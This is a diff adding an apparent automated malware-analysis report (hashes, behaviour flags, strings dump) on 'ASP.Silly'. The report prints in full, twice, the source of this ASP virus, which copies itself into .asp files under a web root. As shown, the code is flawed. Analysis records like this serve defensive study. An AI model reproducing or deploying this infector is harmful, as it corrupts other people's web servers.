@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "write": "May write to a file"
+        },
+        "macro": "<html><head><title>ASP.Silly</title>\n<body>ASP.Silly<br>This is very silly ASP Infector By Psychologic<br>\n\n<%\nSet fso = Server.CreateObject(\"Scripting.FileSystemObject\")\nSet Drives=fso.drives\n\ta = Server.mappath(\"silly.asp\")\n\tSet dropper = Fso.opentextfile(a)\n\tsrc = dropper.readall\ndropper.close\n\n\nSet Folder=fso.getfolder(\"C:\\InetPub\\wwwRoot\")\nSet Files = folder.files \n\tFor Each File in files\n\t\tIf fso.GetExtensionName(file.path)=\"asp\" then\n\t\ton error resume next\n\t\t\tset droper = fso.opentextfile(file.path,1)\n\t\t\t\tdroper.write src\n\t\t\tdroper.close\n\t\tend If\n\tNext\n\nSet Subfolders = folder.SubFolders\n\nFor Each Subfolder in Subfolders\n\nIf fso.GetExtensionName(file.path)=\"asp\" then\n\t\ton error resume next\n\t\t\tset droper = fso.opentextfile(file.path,1)\n\t\t\t\tdroper.write src\n\t\t\tdroper.close\n\t\tend If\nNext\n\n%>\n</body></html>"
+    },
+    "filename": "VirusShare_d8a3bf7b19d91356e6e7e915c921d634",
+    "filesize": 857,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "d8a3bf7b19d91356e6e7e915c921d634",
+        "sha1": "415066f87a33107166ba22a519b6550c3cb5b6b6",
+        "sha256": "6ac6a9d708505c1f70ebfd1c490f95d186af6edd6cdebac306a2cccc7bd74839"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html><head><title>ASP.Silly</title>",
+            "<body>ASP.Silly<br>This is very silly ASP Infector By Psychologic<br>",
+            "Set fso = Server.CreateObject(\"Scripting.FileSystemObject\")",
+            "Set Drives=fso.drives",
+            "\ta = Server.mappath(\"silly.asp\")",
+            "\tSet dropper = Fso.opentextfile(a)",
+            "\tsrc = dropper.readall",
+            "dropper.close",
+            "Set Folder=fso.getfolder(\"C:\\InetPub\\wwwRoot\")",
+            "Set Files = folder.files ",
+            "\tFor Each File in files",
+            "\t\tIf fso.GetExtensionName(file.path)=\"asp\" then",
+            "\t\ton error resume next",
+            "\t\t\tset droper = fso.opentextfile(file.path,1)",
+            "\t\t\t\tdroper.write src",
+            "\t\t\tdroper.close",
+            "\t\tend If",
+            "\tNext",
+            "Set Subfolders = folder.SubFolders",
+            "For Each Subfolder in Subfolders",
+            "If fso.GetExtensionName(file.path)=\"asp\" then",
+            "\t\ton error resume next",
+            "\t\t\tset droper = fso.opentextfile(file.path,1)",
+            "\t\t\t\tdroper.write src",
+            "\t\t\tdroper.close",
+            "\t\tend If",
+            "Next",
+            "</body></html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.292066",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
